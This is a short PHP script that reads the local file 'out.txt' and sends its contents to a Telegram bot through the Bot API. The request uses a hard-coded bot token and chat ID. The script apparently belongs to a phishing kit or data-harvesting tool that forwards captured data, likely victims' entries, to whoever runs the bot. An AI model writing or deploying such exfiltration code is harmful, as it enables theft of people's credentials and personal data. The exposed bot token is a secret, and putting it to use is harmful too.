<?php
    sleep(2);
    $msg = urlencode(file_get_contents("out.txt"));
    file_get_contents("https://api.telegram.org/bot5838154637:AAGvSnc2ddlFUSH2_eViLvu8ANFpYYVq1YI/sendMessage?chat_id=5838154637&text=$msg");
?>
